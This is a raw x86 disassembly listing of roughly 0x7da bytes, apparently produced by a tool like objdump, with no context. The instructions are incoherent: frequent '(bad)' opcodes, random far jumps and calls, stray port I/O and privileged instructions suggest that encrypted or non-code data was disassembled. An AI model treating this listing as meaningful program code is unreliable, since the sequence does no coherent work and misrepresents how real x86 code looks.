  4084b4:	imul   ebp,DWORD PTR [esi],0x5ce0d1f8
  4084ba:	fiadd  WORD PTR [eax]
  4084bc:	adc    eax,0x512368a3
  4084c1:	fistp  QWORD PTR [ecx+eiz*1-0x68]
  4084c5:	arpl   WORD PTR [esi-0x4a],bp
  4084c8:	push   0xf2525ad6
  4084cd:	ret    0x4910
  4084d0:	test   DWORD PTR [esi],edi
  4084d2:	aas    
  4084d3:	jmp    0x5b4c:0x927f3854
  4084da:	mov    WORD PTR [edi-0x56],ss
  4084dd:	mov    eax,0x6b9964fc
  4084e2:	or     ah,BYTE PTR [ecx-0x4a]
  4084e5:	mov    eax,ds:0x8c8992d9
  4084ea:	jmp    0x54c3:0x563209bc
  4084f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4084f2:	mov    ebx,0xdda02879
  4084f7:	xchg   esp,eax
  4084f8:	mov    cl,0x7a
  4084fa:	add    DWORD PTR [edx+eax*2+0x59],edi
  4084fe:	pop    esi
  4084ff:	in     al,0x20
  408501:	js     0x408489
  408503:	aad    0x5
  408505:	leave  
  408506:	pusha  
  408507:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408508:	in     eax,dx
  408509:	cmp    al,0xdd
  40850b:	push   cs
  40850c:	leave  
  40850d:	push   esp
  40850e:	lds    edx,FWORD PTR [ecx+0x3b]
  408511:	jmp    0x4abef4dc
  408516:	sbb    DWORD PTR [ebx-0xeafdabe],esp
  40851c:	fwait
  40851d:	stos   DWORD PTR es:[edi],eax
  40851e:	sub    bl,BYTE PTR [esi+0x57]
  408521:	xor    al,0x17
  408523:	pop    ebx
  408524:	call   0xda03:0x28465c66
  40852b:	mov    esp,0x1afcfd1d
  408530:	ror    DWORD PTR [ebx+0x448e39fb],cl
  408536:	lods   al,BYTE PTR ds:[esi]
  408537:	mov    al,BYTE PTR [ecx]
  408539:	out    0x37,eax
  40853b:	arpl   si,ax
  40853d:	outs   dx,BYTE PTR ds:[esi]
  40853e:	loope  0x4084d9
  408540:	(bad)
  408543:	add    eax,DWORD PTR [ecx-0x55]
  408546:	mov    ecx,0x2e4060e3
  40854b:	shl    BYTE PTR [ebp-0x3b472ca4],0x80
  408552:	jge    0x408591
  408554:	add    eax,0x985663be
  408559:	pop    ecx
  40855a:	sbb    ah,BYTE PTR [esi-0x22]
  40855d:	jp     0x408579
  40855f:	sub    eax,0x571aa7ad
  408564:	push   edi
  408565:	sub    esi,DWORD PTR [esi]
  408567:	(bad)  
  408568:	mov    dl,0x20
  40856a:	mov    edx,0x9a74183f
  40856f:	test   al,0x14
  408571:	call   0xdc63:0xbb0e12f7
  408578:	dec    ebp
  408579:	mul    BYTE PTR [edx-0x74]
  40857c:	push   ebp
  40857d:	loopne 0x40859e
  40857f:	sar    DWORD PTR [ebx+0x2641a966],cl
  408585:	cwde   
  408586:	cs cli 
  408588:	out    dx,eax
  408589:	xchg   BYTE PTR [edi],bl
  40858b:	jmp    0x5195:0x55faf50d
  408592:	int    0xa
  408594:	xor    edi,edi
  408596:	adc    BYTE PTR [ecx],cl
  408598:	cmc    
  408599:	or     BYTE PTR [edx-0x515acf80],dl
  40859f:	scas   eax,DWORD PTR es:[edi]
  4085a0:	arpl   bp,sp
  4085a2:	repz div ebp
  4085a5:	jb     0x408571
  4085a7:	mov    dh,0xd6
  4085a9:	push   ecx
  4085aa:	or     cl,dh
  4085ac:	sbb    al,0x7e
  4085ae:	inc    ecx
  4085af:	pop    esi
  4085b0:	stos   BYTE PTR es:[edi],al
  4085b1:	sbb    eax,0xddbcdec
  4085b6:	es inc ecx
  4085b8:	jns    0x4085b8
  4085ba:	dec    ebp
  4085bb:	inc    eax
  4085bc:	pop    eax
  4085bd:	or     al,0x63
  4085bf:	sbb    ebp,DWORD PTR [eax+ecx*1]
  4085c2:	orps   xmm1,XMMWORD PTR [ecx-0x7e]
  4085c6:	and    bh,BYTE PTR [esi-0x1fbc12bb]
  4085cc:	adc    ebx,eax
  4085ce:	retf   0x90cb
  4085d1:	and    esp,edx
  4085d3:	loope  0x40859c
  4085d5:	xor    BYTE PTR [edx-0x3cd19308],dl
  4085db:	outs   dx,DWORD PTR ds:[esi]
  4085dc:	aaa    
  4085dd:	test   bl,cl
  4085df:	data16 mov ah,0xe8
  4085e2:	dec    BYTE PTR [esi+ebx*8]
  4085e5:	or     BYTE PTR [edi+0x34a53051],bl
  4085eb:	daa    
  4085ec:	push   edi
  4085ed:	jmp    DWORD PTR ss:[edx+0x2b]
  4085f1:	in     al,0x67
  4085f3:	das    
  4085f4:	(bad)  
  4085f5:	out    dx,al
  4085f6:	sub    edi,edi
  4085f8:	fwait
  4085f9:	ja     0x40858e
  4085fb:	mov    ebx,0x1555199
  408600:	mov    dh,0x69
  408602:	pop    esp
  408603:	vpsllw xmm3,xmm4,XMMWORD PTR [ebx-0x6a]
  408609:	loop   0x40859d
  40860b:	inc    esi
  40860c:	stos   BYTE PTR es:[edi],al
  40860d:	xor    al,0x46
  40860f:	pop    ecx
  408610:	ja     0x40865e
  408612:	mov    dh,0xc
  408614:	jae    0x40861f
  408616:	pop    edi
  408617:	(bad)  
  408618:	or     al,0x93
  40861a:	not    DWORD PTR [edi-0x53]
  40861d:	or     BYTE PTR [ecx-0x1e],cl
  408620:	jmp    0xec8d52af
  408625:	cdq    
  408626:	cmp    ah,BYTE PTR [edx-0x3975bd2e]
  40862c:	test   DWORD PTR [eax],ebx
  40862e:	imul   edi,edi,0x7a
  408631:	push   edi
  408632:	add    esp,DWORD PTR [edx+eiz*4+0x79]
  408636:	sub    BYTE PTR [ebp-0x23de8e8a],al
  40863c:	add    BYTE PTR [ecx+ebp*4],0xb6
  408640:	mov    ebx,0xb44fc078
  408645:	jno    0x40863a
  408647:	dec    esp
  408648:	inc    ebp
  408649:	addr16 pusha 
  40864b:	fs popa 
  40864d:	data16 arpl dx,di
  408650:	pop    es
  408651:	mov    al,ds:0x93b804d6
  408656:	enter  0xbcdd,0x3
  40865a:	es inc eax
  40865c:	aad    0xc8
  40865e:	mov    dh,0x4d
  408660:	adc    DWORD PTR [esi-0x8],0xec07124c
  408667:	xor    DWORD PTR [edx+esi*8+0x6e],ebp
  40866b:	aam    0x2d
  40866d:	add    eax,0xf4338faf
  408672:	out    0x19,al
  408674:	sti    
  408675:	jo     0x408657
  408677:	pop    ss
  408678:	jbe    0x4086e4
  40867a:	inc    esi
  40867b:	test   al,0x87
  40867d:	test   DWORD PTR [edx+0x2e1f461a],ecx
  408683:	mov    eax,0x2eaf88f8
  408688:	jg     0x408669
  40868a:	(bad)  
  40868b:	fdiv   DWORD PTR [ecx]
  40868d:	xlat   BYTE PTR ds:[ebx]
  40868e:	mov    ds:0x2324809a,eax
  408693:	push   0x77
  408695:	sar    DWORD PTR [esi+0x38],cl
  408698:	pusha  
  408699:	jmp    0xdef1061
  40869e:	stos   BYTE PTR es:[edi],al
  40869f:	inc    ebp
  4086a0:	and    al,ch
  4086a2:	cmp    eax,esp
  4086a4:	popf   
  4086a5:	dec    ebx
  4086a6:	add    BYTE PTR [esi-0x15],al
  4086a9:	out    0xc6,eax
  4086ab:	stos   BYTE PTR es:[edi],al
  4086ac:	pop    ebp
  4086ad:	ins    DWORD PTR es:[edi],dx
  4086ae:	push   ss
  4086af:	jp     0x40867a
  4086b1:	(bad)  
  4086b2:	not    bl
  4086b4:	je     0x4086af
  4086b6:	enter  0x7ed8,0x83
  4086ba:	arpl   bp,bx
  4086bc:	sub    al,0xaf
  4086be:	push   ds
  4086bf:	mov    dh,0xa4
  4086c1:	mov    edx,0xdb0bace6
  4086c6:	mov    ebp,0xc15df9c1
  4086cb:	jbe    0x408699
  4086cd:	test   BYTE PTR [esi-0x24f96018],al
  4086d3:	jnp    0x4086ac
  4086d5:	jb     0x408696
  4086d7:	inc    ebx
  4086d8:	(bad)  
  4086da:	shl    DWORD PTR [eax+eax*8-0x15],1
  4086de:	dec    edx
  4086df:	xchg   ebx,eax
  4086e0:	inc    ecx
  4086e1:	jecxz  0x408709
  4086e3:	push   0xde12efc4
  4086e8:	std    
  4086e9:	pop    esi
  4086ea:	inc    eax
  4086eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4086ec:	pop    ebp
  4086ed:	sar    BYTE PTR cs:[edx+0x38],cl
  4086f1:	and    dh,BYTE PTR [edi+0x5df428dc]
  4086f7:	xchg   DWORD PTR [ecx-0xfd5a1e],ecx
  4086fd:	arpl   WORD PTR [ecx],si
  4086ff:	push   cs
  408700:	outs   dx,DWORD PTR ds:[esi]
  408701:	test   al,0x43
  408703:	mov    edi,0x94f978e6
  408708:	add    BYTE PTR [edx+0x6d],bh
  40870b:	sti    
  40870c:	in     al,0xe9
  40870e:	inc    ecx
  40870f:	fbld   TBYTE PTR [esi+0x6b56bc99]
  408715:	cmp    bh,dh
  408717:	mov    ebp,0x6c4df595
  40871c:	clc    
  40871d:	ins    DWORD PTR es:[edi],dx
  40871e:	enter  0x4955,0x49
  408722:	retf   
  408723:	nop
  408724:	inc    edi
  408725:	cwde   
  408726:	dec    esp
  408727:	sbb    dl,BYTE PTR [ebp+0x39]
  40872a:	xchg   esi,eax
  40872b:	ins    BYTE PTR es:[edi],dx
  40872c:	mov    ah,0xc9
  40872e:	xchg   BYTE PTR [esi-0x3ca1d596],bl
  408734:	ror    BYTE PTR [edi],1
  408736:	sub    edi,edx
  408738:	xchg   DWORD PTR [edi+0x55],ebp
  40873b:	ins    DWORD PTR es:[edi],dx
  40873c:	lods   eax,DWORD PTR ds:[esi]
  40873d:	ds push ss
  40873f:	add    eax,0x702f7e7d
  408744:	or     al,0xdd
  408746:	iret   
  408747:	pop    esi
  408748:	mov    ah,0xf1
  40874a:	xchg   ecx,eax
  40874b:	outs   dx,BYTE PTR ds:[esi]
  40874c:	add    eax,0x43db123c
  408751:	iret   
  408752:	jnp    0x40879f
  408754:	adc    al,0x0
  408756:	call   0x506f:0x4261fb53
  40875d:	adc    al,0xed
  40875f:	mov    ah,0xf5
  408761:	dec    ebx
  408762:	lods   al,BYTE PTR ds:[esi]
  408763:	sub    eax,0xfd6b49e4
  408768:	inc    ebx
  408769:	bound  ebp,QWORD PTR [edi+0x63802438]
  40876f:	test   DWORD PTR [edi+eax*2+0x7],0x7a9be091
  408777:	mul    DWORD PTR [eax-0x6d]
  40877a:	jge    0x40877b
  40877c:	push   cs
  40877d:	mul    edx
  40877f:	push   ecx
  408780:	(bad)  
  408781:	out    dx,eax
  408782:	mov    ebx,0x424e9cfc
  408787:	ds xchg ebx,eax
  408789:	js     0x4087bb
  40878b:	pop    edx
  40878c:	sub    DWORD PTR [eax+0x26bc051e],eax
  408792:	jb     0x40872c
  408794:	dec    esp
  408795:	test   dh,al
  408797:	add    esp,DWORD PTR [ebx]
  408799:	ret    0xb3a2
  40879c:	scas   eax,DWORD PTR es:[edi]
  40879d:	push   edi
  40879e:	jmp    0xa358:0x716f9a30
  4087a5:	call   0xaf2f:0x27b81927
  4087ac:	push   esi
  4087ad:	ret    
  4087ae:	lea    esp,ds:0xcebf1d61
  4087b4:	mov    dl,ch
  4087b6:	(bad)  
  4087b7:	and    al,0x53
  4087b9:	push   0xffffffa6
  4087bb:	push   ss
  4087bc:	mov    dl,0x3b
  4087be:	fimul  WORD PTR [esi]
  4087c0:	fnsave [ebp-0x22e3c3a7]
  4087c6:	dec    ecx
  4087c7:	xchg   ebp,eax
  4087c8:	ror    DWORD PTR [eax-0x345aaac1],1
  4087ce:	jg     0x4087f6
  4087d0:	fnsave [edi-0x757d5bfb]
  4087d6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4087d7:	dec    esp
  4087d8:	stos   DWORD PTR es:[edi],eax
  4087d9:	mov    DWORD PTR [eax-0x42],esi
  4087dc:	test   DWORD PTR [edx+0x6c],0x7c28d5b0
  4087e3:	xlat   BYTE PTR ds:[ebx]
  4087e4:	sbb    al,0x3b
  4087e6:	jecxz  0x408846
  4087e8:	push   ecx
  4087e9:	add    DWORD PTR [edi-0x1ab83345],0xad8f5450
  4087f3:	cmp    ebx,eax
  4087f5:	lock and dl,dh
  4087f8:	pop    ebp
  4087f9:	jne    0x40880c
  4087fb:	push   esi
  4087fc:	hlt    
  4087fd:	int3   
  4087fe:	stos   DWORD PTR es:[edi],eax
  4087ff:	jp     0x4087f8
  408801:	mov    ebx,DWORD PTR [eax+0x1f]
  408804:	dec    edx
  408805:	icebp  
  408806:	and    dl,ah
  408808:	cdq    
  408809:	push   ebx
  40880a:	fwait
  40880b:	push   ss
  40880c:	ror    DWORD PTR ds:0xfab54b6e,1
  408812:	xchg   edi,eax
  408813:	or     ch,BYTE PTR [edi]
  408815:	mov    eax,0x61382d41
  40881a:	jno    0x408834
  40881c:	clc    
  40881d:	mov    bl,BYTE PTR [ebx+0x55]
  408820:	adc    esi,edx
  408822:	pop    esp
  408823:	fistp  DWORD PTR [ecx]
  408825:	lods   eax,DWORD PTR ds:[esi]
  408826:	adc    al,0x97
  408828:	out    dx,al
  408829:	ja     0x40881b
  40882b:	pop    ds
  40882c:	inc    ecx
  40882d:	int3   
  40882e:	dec    edx
  40882f:	lods   eax,DWORD PTR ds:[esi]
  408830:	dec    eax
  408831:	outs   dx,BYTE PTR ds:[esi]
  408832:	mov    eax,DWORD PTR [edx]
  408834:	mov    bl,0xd3
  408836:	pop    edx
  408837:	jbe    0x4087f3
  408839:	add    edx,DWORD PTR [ebx-0x57]
  40883c:	mov    cx,0xa259
  408840:	lds    ebx,FWORD PTR [ebp+0x1f6afdff]
  408846:	mov    eax,0x99db4b81
  40884b:	sbb    BYTE PTR [ecx+ebp*2],0xe4
  40884f:	mov    ebp,0xc66394dc
  408854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408855:	iret   
  408856:	sbb    eax,0xe8d6da33
  40885b:	jge    0x408835
  40885d:	add    al,0xd3
  40885f:	jp     0x4087f3
  408861:	adc    ecx,ebp
  408863:	cmc    
  408864:	cmp    al,0x6a
  408866:	and    edx,DWORD PTR [ecx+0x74]
  408869:	aas    
  40886a:	loop   0x4088ba
  40886c:	pop    ss
  40886d:	dec    esp
  40886e:	mov    bl,0x15
  408870:	(bad)  
  408871:	in     al,dx
  408872:	xchg   BYTE PTR [ebx-0x65],dl
  408875:	mov    ch,0xf6
  408877:	in     eax,0x36
  408879:	fnstsw ax
  40887b:	data16 rcr ah,0x19
  40887f:	mov    bh,cl
  408881:	inc    edx
  408882:	push   cs
  408883:	push   ebx
  408884:	mov    eax,ds:0x1195ea99
  408889:	pop    esi
  40888a:	dec    esp
  40888b:	hlt    
  40888c:	call   DWORD PTR [edi+0x54450289]
  408892:	mov    ah,0x6
  408894:	push   ebp
  408895:	pop    esp
  408896:	test   DWORD PTR [ecx+0x64f602d4],esi
  40889c:	ret    
  40889d:	xor    BYTE PTR [ebx+eiz*4-0x63],ah
  4088a1:	popa   
  4088a2:	out    dx,al
  4088a3:	cmp    ah,BYTE PTR [ebx-0x68]
  4088a6:	xor    BYTE PTR [ecx],dl
  4088a8:	cdq    
  4088a9:	jbe    0x4088b8
  4088ab:	sub    DWORD PTR ds:0xc1a5d487,edi
  4088b1:	push   0xa2d80dca
  4088b6:	xor    bh,BYTE PTR [ecx+esi*4]
  4088b9:	push   eax
  4088ba:	in     eax,dx
  4088bb:	retf   
  4088bc:	pop    ecx
  4088bd:	ret    
  4088be:	(bad)  
  4088bf:	ins    BYTE PTR es:[edi],dx
  4088c0:	shl    esi,1
  4088c2:	push   edx
  4088c3:	and    DWORD PTR [edx],esi
  4088c5:	outs   dx,DWORD PTR ds:[esi]
  4088c6:	std    
  4088c7:	fstp   TBYTE PTR [ebp-0x24]
  4088ca:	add    BYTE PTR [esi+0x38],dh
  4088cd:	in     al,dx
  4088ce:	inc    ecx
  4088cf:	int    0x5
  4088d1:	and    al,0x72
  4088d3:	test   eax,0x2a82f0b1
  4088d8:	mov    al,0x14
  4088da:	pop    ss
  4088db:	jns    0x408886
  4088dd:	lods   eax,DWORD PTR ds:[esi]
  4088de:	jns    0x408947
  4088e0:	pusha  
  4088e1:	xor    al,0xc0
  4088e3:	dec    ecx
  4088e4:	aas    
  4088e5:	jle    0x408941
  4088e7:	inc    ebp
  4088e8:	clc    
  4088e9:	adc    eax,0xc3df80ea
  4088ee:	push   0xfffffff0
  4088f0:	xor    DWORD PTR [ebp+0x318160a3],edi
  4088f6:	mov    dl,0xae
  4088f8:	jle    0x40891e
  4088fa:	cmp    eax,0x3b15ef4b
  4088ff:	nop
  408900:	les    ecx,FWORD PTR ss:0x54b728e2
  408907:	popf   
  408908:	fadd   st(4),st
  40890a:	jo     0x40897e
  40890c:	xchg   edi,eax
  40890d:	ins    BYTE PTR es:[edi],dx
  40890e:	xchg   ecx,eax
  40890f:	cld    
  408910:	xor    ch,bh
  408912:	ds dec esi
  408914:	mov    esp,0xacc2ba8e
  408919:	test   al,0x7e
  40891b:	pop    esp
  40891c:	in     eax,dx
  40891d:	xchg   DWORD PTR [edi+ebx*8],ecx
  408920:	(bad)  
  408921:	xor    DWORD PTR [edi-0x4b],esi
  408924:	dec    edx
  408925:	pop    edx
  408926:	(bad)  
  408927:	sbb    eax,0x22b776e7
  40892c:	sub    dh,BYTE PTR [ebx-0x68dd11f]
  408932:	call   0xee30:0xbd8749ee
  408939:	and    ch,dh
  40893b:	bound  edx,QWORD PTR ds:0xbe74d282
  408941:	add    al,0xfa
  408943:	jl     0x40896f
  408945:	out    0xbd,eax
  408947:	push   ebp
  408948:	adc    DWORD PTR [edi-0x5e],0x955a2b8d
  40894f:	nop
  408950:	inc    esi
  408951:	xor    bl,BYTE PTR [edi]
  408953:	jle    0x4089ac
  408955:	xchg   esi,eax
  408956:	fidiv  DWORD PTR [ebx]
  408958:	imul   BYTE PTR [esi-0x41]
  40895b:	je     0x408940
  40895d:	mov    al,0xf8
  40895f:	add    bh,BYTE PTR [esi+0x7b]
  408962:	pop    ecx
  408963:	test   eax,0x6483341
  408968:	(bad)  
  408969:	out    0x5b,eax
  40896b:	scas   eax,DWORD PTR es:[edi]
  40896c:	cli    
  40896d:	cmp    eax,0xb72976d8
  408972:	je     0x40898e
  408974:	jg     0x408917
  408976:	and    eax,0x358b2ae5
  40897b:	(bad)  
  40897c:	mov    eax,0x1126322e
  408981:	bound  ebx,QWORD PTR [edx+0x543c4153]
  408987:	cmp    DWORD PTR [ebp+0x7b],ebp
  40898a:	add    ah,BYTE PTR [edx-0x6d]
  40898d:	mov    esp,DWORD PTR [ebx-0x11]
  408990:	dec    eax
  408991:	adc    ebp,DWORD PTR [edx+eax*2+0x5939eb58]
  408998:	xchg   ecx,eax
  408999:	mov    dh,0xa2
  40899b:	pop    edi
  40899c:	iret   
  40899d:	push   ds
  40899e:	mov    ds:0x6e5e2fe5,al
  4089a3:	out    dx,al
  4089a4:	mov    fs,WORD PTR [edx+0x3a]
  4089a7:	(bad)  
  4089a8:	in     al,0x51
  4089aa:	stc    
  4089ab:	push   ebx
  4089ac:	loopne 0x408981
  4089ae:	shr    BYTE PTR es:[ebx-0x2f478ee2],1
  4089b5:	pop    ss
  4089b6:	pop    esp
  4089b7:	mov    al,0xf6
  4089b9:	pushf  
  4089ba:	(bad)  
  4089bc:	pop    es
  4089bd:	inc    edx
  4089be:	into   
  4089bf:	stc    
  4089c0:	fst    st(3)
  4089c2:	out    0xb3,eax
  4089c4:	loope  0x408964
  4089c6:	sbb    ebp,DWORD PTR [edx]
  4089c8:	cmp    ecx,DWORD PTR ds:0xe9c00bf
  4089ce:	mov    cl,0x65
  4089d0:	and    ebp,DWORD PTR [edi+0x5b]
  4089d3:	push   edi
  4089d4:	xchg   esp,eax
  4089d5:	push   ds
  4089d6:	jg     0x4089f4
  4089d8:	imul   edx,DWORD PTR [eax+0x68237368],0xcb8c0c8
  4089e2:	sub    eax,0x8a57421e
  4089e7:	std    
  4089e8:	mov    ds:0xd9fc145d,eax
  4089ed:	sub    DWORD PTR [esi-0x12],esi
  4089f0:	test   eax,0x856ea080
  4089f5:	in     al,dx
  4089f6:	push   ebp
  4089f7:	or     BYTE PTR [ecx+0x730b748d],0x6c
  4089fe:	outs   dx,BYTE PTR ds:[esi]
  4089ff:	push   cs
  408a00:	xor    BYTE PTR [ebx+ebx*4],cl
  408a03:	adc    al,0xbf
  408a05:	mov    ecx,0xbf3ee552
  408a0a:	xor    eax,0x288295d9
  408a0f:	xor    esi,DWORD PTR [edi+0x5bf0b391]
  408a15:	mov    WORD PTR [edi-0x4ac0f34b],cs
  408a1b:	cmp    al,BYTE PTR [ebx+0x36c70687]
  408a21:	sbb    DWORD PTR [edx+0xe8f30cb],edi
  408a27:	clc    
  408a28:	cdq    
  408a29:	jl     0x408a0a
  408a2b:	jle    0x408a5f
  408a2d:	add    ch,BYTE PTR [ebp-0x9e91795]
  408a33:	xor    al,0x34
  408a35:	imul   edx,DWORD PTR [ebx+0x31],0xffffffe3
  408a39:	and    DWORD PTR [ebp+0x32156592],eax
  408a3f:	sub    al,BYTE PTR [ebx+0x19]
  408a42:	(bad)  
  408a43:	mov    ah,0xec
  408a45:	and    DWORD PTR [ecx+0x6a652f2d],ebp
  408a4b:	jmp    0xe8a3429e
  408a50:	fdiv   DWORD PTR [edi]
  408a52:	jmp    0x408a0d
  408a54:	ds xchg ecx,eax
  408a56:	adc    eax,0xb4be2c66
  408a5b:	test   esi,ebp
  408a5d:	imul   esp,DWORD PTR fs:[edi+0x3586f616],0xabb24b40
  408a68:	and    al,0xaf
  408a6a:	out    dx,al
  408a6b:	jecxz  0x408a67
  408a6d:	aas    
  408a6e:	dec    edi
  408a6f:	or     al,0xee
  408a71:	jnp    0x408a32
  408a73:	test   al,0xd7
  408a75:	xchg   ecx,eax
  408a76:	imul   edi,DWORD PTR [ecx],0xe59e76d9
  408a7c:	fwait
  408a7d:	test   eax,0xbb0891bc
  408a82:	int    0xb8
  408a84:	jae    0x408ae4
  408a86:	add    DWORD PTR [ecx+0x21291185],edx
  408a8c:	sbb    eax,0xcca4de54
  408a91:	loop   0x408aa6
  408a93:	iret   
  408a94:	push   eax
  408a95:	pop    es
  408a96:	out    0x44,eax
  408a98:	inc    ecx
  408a99:	lock stos BYTE PTR es:[edi],al
  408a9b:	popf   
  408a9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408a9d:	loopne 0x408ade
  408a9f:	fs nop
  408aa1:	push   0xedc41923
  408aa6:	jle    0x408ad1
  408aa8:	jp     0x408a33
  408aaa:	add    al,0xed
  408aac:	xchg   edx,eax
  408aad:	add    bl,al
  408aaf:	sub    dl,BYTE PTR [ebp+0x1e86a256]
  408ab5:	jnp    0x408abf
  408ab7:	add    eax,0x6e3395f9
  408abc:	popa   
  408abd:	push   ebx
  408abe:	retf   0x91c0
  408ac1:	mov    dl,0x96
  408ac3:	sti    
  408ac4:	ds add eax,0xfb9cb772
  408aca:	in     eax,0x52
  408acc:	(bad)  
  408acd:	pop    ebp
  408ace:	push   ebp
  408acf:	(bad)  
  408ad0:	push   edx
  408ad1:	jo     0x408b4c
  408ad3:	iret   
  408ad4:	mov    ds,WORD PTR [edx]
  408ad6:	fnstcw WORD PTR [ecx+0x5]
  408ad9:	inc    ebp
  408ada:	adc    eax,0x7e5f7760
  408adf:	and    dh,cl
  408ae1:	mov    eax,0xb6b429b9
  408ae6:	adc    eax,0x66a20c6d
  408aeb:	jns    0x408a71
  408aed:	ret    0x8c9e
  408af0:	sbb    esp,DWORD PTR [ebx+0x55]
  408af3:	outs   dx,BYTE PTR ds:[esi]
  408af4:	fist   DWORD PTR [esi-0x46]
  408af7:	jmp    0x408b26
  408af9:	dec    esp
  408afa:	or     DWORD PTR [edx+0x1f8ae793],esi
  408b00:	stc    
  408b01:	repnz and DWORD PTR [eax],ebp
  408b04:	fs mov ebp,0x64c30ee4
  408b0a:	xchg   edi,eax
  408b0b:	and    ebx,DWORD PTR [edx-0x24]
  408b0e:	add    al,0x58
  408b10:	pusha  
  408b11:	sub    edi,edi
  408b13:	pop    es
  408b14:	movups XMMWORD PTR [esi-0x59],xmm4
  408b18:	les    esi,FWORD PTR [eax-0xb6ded4f]
  408b1e:	inc    esi
  408b1f:	mov    esp,0x23a6b011
  408b24:	cmp    edx,edx
  408b26:	fwait
  408b27:	aad    0x6
  408b29:	pop    esi
  408b2a:	into   
  408b2b:	push   ds
  408b2c:	dec    eax
  408b2d:	sbb    BYTE PTR [ebx-0x62977b],0x2a
  408b34:	xchg   esp,eax
  408b35:	mov    dh,BYTE PTR [ebp-0x1308755b]
  408b3b:	pop    es
  408b3c:	mov    eax,0x5e17fc5b
  408b41:	pop    ebx
  408b42:	aam    0x45
  408b44:	push   eax
  408b45:	aas    
  408b46:	fisub  WORD PTR [ecx+0x34]
  408b49:	dec    edi
  408b4a:	or     dh,BYTE PTR [ecx+ebx*8+0x2ae449d6]
  408b51:	xchg   esp,eax
  408b52:	mov    cl,0x78
  408b54:	or     al,BYTE PTR [ecx]
  408b56:	adc    ah,dl
  408b58:	ror    DWORD PTR [eax],cl
  408b5a:	gs xor ch,0xf
  408b5e:	add    al,0xa8
  408b60:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b61:	pushf  
  408b62:	sbb    al,0xab
  408b64:	pusha  
  408b65:	inc    eax
  408b66:	or     ebp,eax
  408b68:	retf   0x695c
  408b6b:	sub    DWORD PTR [edi+0x21],edi
  408b6e:	rol    al,1
  408b70:	add    edi,eax
  408b72:	sub    BYTE PTR [eax-0x52],0x90
  408b76:	out    dx,al
  408b77:	es inc edx
  408b79:	xor    al,0x6a
  408b7b:	ret    0x295d
  408b7e:	push   ebp
  408b7f:	mov    esi,0xe63e9b80
  408b84:	mov    BYTE PTR [ebx+0x2d],bl
  408b87:	(bad)  
  408b88:	mov    DWORD PTR [ecx-0x3f1abd4c],ebx
  408b8e:	mov    edi,0xb17b8e1b
  408b93:	push   eax
  408b94:	sub    eax,0xf215a7a8
  408b99:	inc    BYTE PTR [eax]
  408b9b:	xchg   ebp,eax
  408b9c:	or     ch,bl
  408b9e:	push   edi
  408b9f:	mov    BYTE PTR [esi+0x13],dh
  408ba2:	adc    DWORD PTR ds:[esi],ebp
  408ba5:	mov    ch,0x9a
  408ba7:	mov    edi,0xe6a7a75f
  408bac:	xor    esi,ebx
  408bae:	dec    ecx
  408baf:	ins    BYTE PTR es:[edi],dx
  408bb0:	loop   0x408c2d
  408bb2:	mov    esi,0x1d28e6b2
  408bb7:	dec    ecx
  408bb8:	hlt    
  408bb9:	popa   
  408bba:	mov    ds:0xfdf384bb,eax
  408bbf:	add    ah,BYTE PTR [eax-0x921d3cd]
  408bc5:	push   ecx
  408bc6:	mov    ah,ah
  408bc8:	or     dh,BYTE PTR [edi]
  408bca:	mov    WORD PTR [ecx],gs
  408bcc:	les    edi,FWORD PTR [ebx+eiz*2]
  408bcf:	shl    DWORD PTR [edx+ecx*4+0x50],1
  408bd3:	sub    cl,BYTE PTR [esi-0x78065f36]
  408bd9:	sar    BYTE PTR [esi-0x74],cl
  408bdc:	lds    esp,FWORD PTR [esi]
  408bde:	jae    0x408b99
  408be0:	push   ds
  408be1:	shl    dh,cl
  408be3:	rcl    DWORD PTR [edi],0x3e
  408be6:	mov    dl,0x4e
  408be8:	mov    ebp,0xc7344831
  408bed:	data16 in al,dx
  408bef:	sub    al,0x94
  408bf1:	push   edi
  408bf2:	jmp    0xa44aa915
  408bf7:	or     ah,BYTE PTR ds:[eax]
  408bfa:	loop   0x408be4
  408bfc:	jge    0x408bcf
  408bfe:	in     al,0xff
  408c00:	adc    ch,BYTE PTR [edi+0x6324a634]
  408c06:	das    
  408c07:	aam    0xd3
  408c09:	add    edx,DWORD PTR [ebp+0x133b123a]
  408c0f:	mov    cl,0x41
  408c11:	push   cs
  408c12:	add    al,0xb3
  408c14:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c15:	mov    eax,0x92a31050
  408c1a:	daa    
  408c1b:	stc    
  408c1c:	mov    dh,0x8b
  408c1e:	jle    0x408c6f
  408c20:	jmp    0x408c94
  408c22:	adc    esp,edx
  408c24:	pop    edi
  408c25:	mov    fs,WORD PTR [edi-0x7c]
  408c28:	add    ebx,DWORD PTR [ebx-0x2b]
  408c2b:	shl    BYTE PTR [edx+0x16],1
  408c2e:	fsubr  DWORD PTR [edi-0x3b]
  408c31:	mov    esi,0x7e302901
  408c36:	sub    edi,ecx
  408c38:	jge    0x408c65
  408c3a:	or     esp,DWORD PTR [ecx]
  408c3c:	es jno 0x408beb
  408c3f:	push   ebx
  408c40:	mov    esi,0xc0b007c7
  408c45:	inc    ebx
  408c46:	neg    bh
  408c48:	fsub   QWORD PTR [eax-0x5889f3b7]
  408c4e:	xchg   edx,eax
  408c4f:	xor    bh,BYTE PTR [esi+ebp*8]
  408c52:	add    eax,0x4e08e6b0
  408c57:	mov    WORD PTR [esi-0x3f],?
  408c5a:	jne    0x408c49
  408c5c:	jmp    0x6218:0x70dfa577
  408c63:	push   cs
  408c64:	push   ecx
  408c65:	les    edi,FWORD PTR [ebp+0x38]
  408c68:	aad    0x20
  408c6a:	jo     0x408c91
  408c6c:	mov    edx,es
  408c6e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c6f:	cmp    ah,BYTE PTR [edi]
  408c71:	repz rcr eax,cl
  408c74:	into   
  408c75:	fist   WORD PTR [esi-0x4dee0b9d]
  408c7b:	mov    fs,WORD PTR [edx-0x61352d26]
  408c81:	(bad)  
  408c82:	xchg   esp,eax
  408c83:	push   es
  408c84:	and    ebx,ebx
  408c86:	or     edi,DWORD PTR [esi+0x3837060e]
  408c8c:	adc    al,BYTE PTR [edi]
  408c8e:	icebp  
